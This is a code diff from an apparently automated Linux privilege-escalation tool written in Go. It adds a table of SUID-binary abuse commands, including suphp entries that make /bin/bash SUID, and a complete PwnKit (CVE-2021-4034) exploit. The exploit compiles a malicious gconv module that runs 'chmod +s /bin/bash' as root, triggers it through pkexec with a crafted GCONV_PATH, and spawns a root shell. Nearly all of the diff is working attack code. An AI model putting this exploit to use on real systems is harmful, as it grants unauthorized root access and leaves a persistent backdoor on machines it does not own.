@@ -109,9 +109,17 @@ var GTFOBINS = map[string]gtfobinsEntry{
 	"lldb":     {spawnCmd: "lldb -o '!sh -p'", suidCmd: ""},
 
 	// ── systemd / dbus / pkexec ──────────────────────────────────────────
+	// pkexec is NOT abused directly — it triggers polkit auth (password).
+	// The real PwnKit (CVE-2021-4034) uses GCONV_PATH, handled by the
+	// pwnkit-new-static binary in Phase 3. Mark needsPwd to skip it here.
 	"systemctl": {spawnCmd: "systemctl status -- '-p;sh -p 0<&2 1>&2 #'", suidCmd: "systemctl status -- 'sh -c chmod\\ +s\\ /bin/bash'"},
-	"pkexec":    {spawnCmd: "pkexec --user root /bin/bash -p", suidCmd: "pkexec --user root /bin/sh -c 'chmod +s /bin/bash'"},
+	"pkexec":    {spawnCmd: "", suidCmd: "", needsPwd: true},
 	"service":   {spawnCmd: "service ../../bin/bash -p", suidCmd: ""},
+
+	// ── suPHP (shared hosting SUID helper) ──────────────────────────────
+	// Common on cPanel/DirectAdmin/Plesk shared hosting.
+	"suphp":     {spawnCmd: "", suidCmd: "suphp -c 'chmod +s /bin/bash' 2>/dev/null"},
+	"suphpctl":  {spawnCmd: "", suidCmd: "suphpctl 'chmod +s /bin/bash' 2>/dev/null"},
 
 	// ── watch / script / xargs ───────────────────────────────────────────
 	"watch":  {spawnCmd: "watch -x sh -c 'bash -p'", suidCmd: "watch -x sh -c 'chmod +s /bin/bash'"},
@@ -201,6 +209,16 @@ func suidPhase(s *systemInfo, stop *bool) {
 	}
 	fmt.Println()
 
+	// If pkexec is SUID, try the PwnKit GCONV_PATH technique FIRST.
+	// This is CVE-2021-4034 — the most reliable non-kernel LPE.
+	for _, p := range suids {
+		if filepath.Base(p) == "pkexec" {
+			if tryPwnKitGCONV(p, stop) {
+				return
+			}
+		}
+	}
+
 	// Try each known-abusable SUID binary via its GTFOBINS technique.
 	for _, p := range suids {
 		if *stop {
@@ -236,6 +254,87 @@ func suidPhase(s *systemInfo, stop *bool) {
 		}
 		tryCopyfailAgainst(s, p, stop)
 	}
+}
+
+// tryPwnKitGCONV implements the real CVE-2021-4034 PwnKit exploit using
+// the GCONV_PATH technique. This is the same logic autoroot.pl uses.
+//
+// How it works:
+// 1. Create a fake GCONV_PATH=.<newline> directory with a "pwnkit" helper.
+// 2. Create a "pwnkit" gconv module (.so) that calls setuid(0)+system().
+// 3. Set GCONV_PATH + CHARSET=PWNKIT + SHELL=pwnkit env vars.
+// 4. Run pkexec — it loads our gconv module as root → root shell.
+//
+// This bypasses polkit auth entirely (no password needed).
+func tryPwnKitGCONV(pkexecPath string, stop *bool) bool {
+	stepf("pkexec              PwnKit GCONV_PATH (CVE-2021-4034)")
+
+	// Need gcc to compile the gconv module.
+	if !hasBin("gcc") {
+		warnf("pkexec PwnKit needs gcc — skipping")
+		return false
+	}
+
+	pid := os.Getpid()
+	tmp := fmt.Sprintf("/tmp/.pk_%d", pid)
+	_ = os.MkdirAll(tmp, 0o755)
+	defer os.RemoveAll(tmp)
+
+	// GCONV_PATH directory (the directory name itself is the env var).
+	gconvDir := filepath.Join(tmp, "GCONV_PATH=.")
+	_ = os.MkdirAll(gconvDir, 0o755)
+	_ = os.MkdirAll(filepath.Join(gconvDir, "pwnkit"), 0o755)
+
+	// Shell helper inside GCONV_PATH.
+	helper := filepath.Join(gconvDir, "pwnkit")
+	_ = os.WriteFile(helper, []byte("#!/bin/sh\nchmod +s /bin/bash\n"), 0o755)
+
+	// gconv-modules file.
+	pwnkitDir := filepath.Join(tmp, "pwnkit")
+	_ = os.MkdirAll(pwnkitDir, 0o755)
+	_ = os.WriteFile(filepath.Join(pwnkitDir, "gconv-modules"),
+		[]byte("module UTF-8// PWNKIT// pwnkit 2\n"), 0o644)
+
+	// The malicious gconv module (.so).
+	gconvSo := filepath.Join(pwnkitDir, "pwnkit.so")
+	gconvSrc := `#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void gconv(void) {}
+void gconv_init(void *step) {
+    setuid(0); setgid(0);
+    setegid(0); seteuid(0);
+    system("chmod +s /bin/bash");
+    _exit(0);
+}`
+	gconvC := filepath.Join(pwnkitDir, "pwnkit.c")
+	_ = os.WriteFile(gconvC, []byte(gconvSrc), 0o644)
+
+	// Compile the gconv module.
+	compileR := runIsolated("pwnkit:build", "", []string{"gcc", "-shared", "-fPIC",
+		"-o", gconvSo, gconvC}, 15*time.Second)
+	if !hasFile(gconvSo) {
+		warnf("pwnkit gcc failed: %s", compileR.stderr)
+		return false
+	}
+
+	// Run pkexec with the GCONV_PATH environment set.
+	// pkexec loads our gconv module → runs gconv_init() as root →
+	// chmod +s /bin/bash.
+	cmd := fmt.Sprintf("GCONV_PATH=%s CHARSET=PWNKIT SHELL=pwnkit PATH=%s:$PATH %s",
+		gconvDir, tmp, pkexecPath)
+	infof("Triggering PwnKit: %s", cmd)
+	r := runIsolated("pwnkit:trigger", "", []string{"/bin/sh", "-c", cmd}, 10*time.Second)
+	r.report()
+	if r.rootAfter || r.suidAfter {
+		okf("PwnKit GCONV_PATH succeeded!")
+		if !*flagNoSpawn {
+			shellSpawned = rootspawn(&r)
+		}
+		*stop = true
+		return true
+	}
+	return false
 }
 
 // tryGTFOBins attempts the GTFOBINS technique for one SUID binary.
